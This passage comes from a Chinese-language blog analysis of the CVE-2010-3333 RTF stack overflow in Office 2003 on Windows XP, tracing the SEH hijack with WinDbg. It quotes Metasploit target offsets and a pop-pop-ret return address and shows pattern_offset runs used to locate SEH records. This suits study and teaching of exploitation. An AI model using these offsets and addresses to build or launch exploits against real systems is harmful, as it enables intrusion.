v11.0.8307.0</span><br><span class="line"># Office v11.8328.8221, winword.exe v11.0.8328.0</span><br><span class="line">[ &apos;Microsoft Office 2003 SP3 English on Windows XP SP3 English&apos;,</span><br><span class="line">    &#123;</span><br><span class="line">        &apos;Offsets&apos; =&gt; [ 24580, 51156 ],</span><br><span class="line">        &apos;Ret&apos; =&gt; 0x30001bdd # p/p/r in winword.exe</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">0x001237DC pFragments缓冲区起始地址</span><br><span class="line">......</span><br><span class="line">0x001297E0 0x6E46336E 并不是SEH记录(0x001297E0-0x001237DC=24580)</span><br><span class="line">......</span><br><span class="line">0x0012FFB0 0x4E32704E SEH记录(0x0012FFB0-0x001237DC=51156)</span><br><span class="line">......</span><br><span class="line">0x0012FFE0 0x4E38714E SEH链尾部</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到在<code>Metasploit</code>的<code>生成样本</code>的脚本中，当前所<code>使用的环境</code>对应的<code>Target</code>中，有<code>两个偏移</code>，<code>51156</code>正是当前<code>SEH链表</code>的<code>第1个SEH记录(0x0012FFB0)</code>距pFragments缓冲区起始地址(<code>0x001237DC</code>)的偏移，而<code>24580</code>所对应的<code>栈数据</code>并不是<code>SEH链表</code>中的<code>SEH记录</code>，不太清楚为什么，实际<code>控制流劫持</code>过程中也<code>没用到</code>此处的数据。</p>
<p>&emsp;&emsp;覆盖栈数据<code>之后</code>，原本的SEH链表<code>被覆盖</code>，<code>覆盖之后</code>的<code>SEH链表</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 4E32704E |    指向下一个SEH记录的指针</span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFB4 | 704E3370 |    SE处理程序</span><br><span class="line">                       +----------+  </span><br><span class="line">                       |          |  </span><br><span class="line">               ......  |  ......  |  </span><br><span class="line">                       |          |  </span><br><span class="line">                       +----------+   </span><br><span class="line">            0x0012FFE0 | 4E38714E |    SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 724E3971 |    SE处理程序</span><br><span class="line">                       +----------+</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在这里<code>计算偏移量</code>时，有<code>两种方法</code>。<code>方法一</code>，手算，只要知道<code>缓冲区的起始地址</code>以及<code>SEH记录的位置</code>就可以算出偏移。<code>方法二</code>，使用<code>Metasploit</code>提供的两个工具，<code>pattern_creat.rb</code>和<code>pattern_offset.rb</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 65600</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9</span><br><span class="line">.......</span><br><span class="line">6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 6E46336E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 4300</span><br><span class="line">[*] Exact match at offset 24580 &lt;----</span><br><span class="line">[*] Exact match at offset 44860</span><br><span class="line">[*] Exact match at offset 65140</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 4E32704E -l 65600 </span></span><br><span class="line">[*] Exact match at offset 10596</span><br><span class="line">[*] Exact match at offset 30876</span><br><span class="line">[*] Exact match at offset 51156 &lt;----</span><br></pre></td></tr></table></figure>
<h4 id="4、SEH劫持过程分析"><a href="#4、SEH劫持过程分析" class="headerlink" title="4、SEH劫持过程分析"></a>4、SEH劫持过程分析</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p>
<p>&emsp;&emsp;通过<code>msf</code>生成样本的脚本可知，<code>当前环境</code>所使用的用于<code>覆盖SEH处理程序地址</code>的地址为<code>0x30001bdd</code>，其位于<code>winword.exe</code>。我们使用<code>WinDbg</code>对<code>CVE-2010-3333(target2,calc).rtf</code>进行调试，首先对地址<code>0x30001bdd</code>下一个断点，然后查看<code>栈回溯</code>，通过栈回溯了解<code>SEH劫持的过程</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">908.</span>acc): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffdb000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0387ffcc <span class="built_in">ebp</span>=0387fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bp</span> <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06420000</span> 065c1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">(<span class="number">908.</span>3d4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line"><span class="number">00123404</span> 7c92327a 001234cc 0012ffb0 001234e8 WINWORD+<span class="number">0x1bdd</span>(<span class="number">0x30001bdd</span>,当前指令地址)</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 7c92e46a <span class="number">00000000</span> 001234e8 001234cc ntdll!ExecuteHandler+<span class="number">0x24</span>(<span class="number">0x7c92327a</span>)[ntdll!ExecuteHandler2 (7c923282)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001234b4 30ed442c <span class="number">00000000</span> 001234e8 001234cc ntdll!KiUserExceptionDispatcher+<span class="number">0xe</span>(<span class="number">0x7c92e46a</span>)[ntdll!RtlDispatchException (7c94a950)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">001237ec 42030f42 2ac372e9 d32cf01d 36a595dd mso!Ordinal1246+<span class="number">0x16b0</span>(<span class="number">0x30ed442c</span>,发生异常指令地址)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道，<code>0x30ed442c</code>处的指令<code>“rep movsd”</code>发生<code>内存访问异常</code>后，系统首先将<code>异常信息</code>发送给<code>调试器</code>，调试器<code>未处理该异常</code>，则将控制权交给<code>ntdll!KiUserExceptionDispatcher</code>函数。接下来的<code>调用过程</code>如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdll!KiUserExceptionDispatcher(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                                PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlDispatchException(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                           PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlpExecuteHandlerForException(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                                     CONTEXT pContext,</span><br><span class="line">                                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                     CONTEXT pContext,</span><br><span class="line">                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler2(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                      PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                      CONTEXT pContext,</span><br><span class="line">                      DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                      (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">WINWORD+0x1bdd(0x30001bdd),SEH处理程序地址</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们对<code>上述函数</code>所在地址<code>下断点</code>，然后进行<code>跟踪</code>，查看<code>每个函数</code>的<code>参数内容</code>。由于这些函数的参数大多是<code>结构体指针</code>，所以我们用<code>WinDbg调试</code>可以更直观的看到这些<code>参数所对应的结构体内容</code>(dt命令)。WinDbg结合<code>符号文件</code>，可以非常清楚地显示<code>各类数据结构</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">140.</span>b54): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffda000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0336ffcc <span class="built_in">ebp</span>=0336fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E45C</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E465</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C94A9EA</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923256</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923275</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C9232A6</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 7c92e45c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher</span><br><span class="line"> <span class="number">1</span> e 7c92e465     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span></span><br><span class="line"> <span class="number">2</span> e 7c94a9ea     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!RtlDispatchException+<span class="number">0xac</span></span><br><span class="line"> <span class="number">3</span> e 7c923256     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler</span><br><span class="line"> <span class="number">4</span> e 7c923275     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler+<span 